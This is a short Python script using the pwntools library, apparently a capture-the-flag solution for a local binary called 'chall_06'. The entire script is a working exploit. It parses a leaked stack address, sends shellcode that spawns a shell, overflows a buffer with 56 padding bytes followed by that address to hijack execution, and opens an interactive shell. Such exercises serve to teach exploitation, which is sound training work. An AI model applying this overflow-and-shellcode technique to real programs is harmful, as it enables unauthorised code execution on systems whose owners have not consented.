from pwn import *
def main():
	p = process("./chall_06")
	addr = p.recv()
	addr = addr.decode().split("0x")[1].split("\n")[0] 
	context.arch = "amd64"
	p.sendline(asm(shellcraft.sh()))
	payload = ((72 - 16) * "A").encode() + p64(int(addr,16))
	print(p.recv())
	p.sendline(payload)
	p.interactive()
main()
